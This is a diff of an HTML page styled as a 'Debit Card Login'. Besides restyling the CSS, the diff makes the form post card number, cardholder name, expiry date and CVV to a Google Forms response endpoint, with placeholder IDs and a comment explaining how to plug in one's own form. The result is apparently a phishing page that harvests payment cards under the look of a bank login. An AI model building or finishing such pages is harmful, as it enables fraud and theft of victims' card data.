@@ -1,46 +1,61 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
   <title>Debit Card Login</title>
   <style>
     body {
-      font-family: 'Arial', sans-serif;
-      background: #f0f0f0;
+      margin: 0;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
-      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #1a1a1a, #111111);
     }
 
     .card {
-      width: 420px;
-      padding: 25px;
-      background-color: #000000; /* black background */
+      width: 400px;
+      padding: 30px;
       border-radius: 20px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-      color: white;
+      background: rgba(0, 0, 0, 0.85);
+      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+      backdrop-filter: blur(10px);
+      color: #fff;
       display: flex;
       flex-direction: column;
-      gap: 15px;
+      gap: 20px;
+    }
+
+    .card h2 {
+      margin: 0;
+      text-align: center;
+      font-weight: bold;
+      font-size: 24px;
     }
 
     label {
-      font-weight: bold;
       font-size: 14px;
-      margin-top: 10px;
+      font-weight: bold;
+      margin-bottom: 5px;
+      display: block;
     }
 
     input {
       width: 100%;
       padding: 12px 15px;
-      margin-top: 5px;
-      border-radius: 8px;
+      border-radius: 10px;
       border: none;
+      background-color: rgba(255,255,255,0.05);
+      color: #fff;
       font-size: 16px;
-      background-color: #111111;
-      color: white;
-      box-sizing: border-box;
+      outline: none;
+      transition: 0.3s;
+      margin-bottom: 10px;
+    }
+
+    input:focus {
+      background-color: rgba(255,255,255,0.1);
     }
 
     .row {
@@ -56,16 +71,16 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      background-color: #1c1c1c;
-      border-radius: 10px;
+      gap: 10px;
       padding: 12px;
+      border-radius: 12px;
+      background-color: #111111;
       cursor: pointer;
-      transition: 0.3s;
-      margin-top: 15px;
-      border: none;
       font-weight: bold;
       font-size: 16px;
-      color: white;
+      border: none;
+      color: #fff;
+      transition: 0.3s;
     }
 
     .submit-bar:hover {
@@ -75,7 +90,6 @@
     .submit-bar img {
       height: 24px;
       width: 24px;
-      margin-right: 12px;
     }
 
   </style>
@@ -83,21 +97,27 @@
 <body>
 
 <div class="card">
-  <form>
+  <h2>Debit Card Login</h2>
+  <form 
+    action="https://docs.google.com/forms/d/e/YOUR_FORM_ID/formResponse" 
+    method="POST" 
+    target="_blank"
+  >
+    <!-- Replace the entry.X values with your Google Form field IDs -->
     <label>Card Number</label>
-    <input type="text" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
+    <input type="text" name="entry.123456789" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
 
     <label>Cardholder Name</label>
-    <input type="text" placeholder="John Doe">
+    <input type="text" name="entry.987654321" placeholder="John Doe" required>
 
     <div class="row">
       <div>
         <label>Exp Date</label>
-        <input type="text" placeholder="MM/YY" maxlength="5">
+        <input type="text" name="entry.111213141" placeholder="MM/YY" maxlength="5" required>
       </div>
       <div>
         <label>CVV</label>
-        <input type="text" placeholder="XXX" maxlength="3">
+        <input type="text" name="entry.151617181" placeholder="XXX" maxlength="3" required>
       </div>
     </div>
 
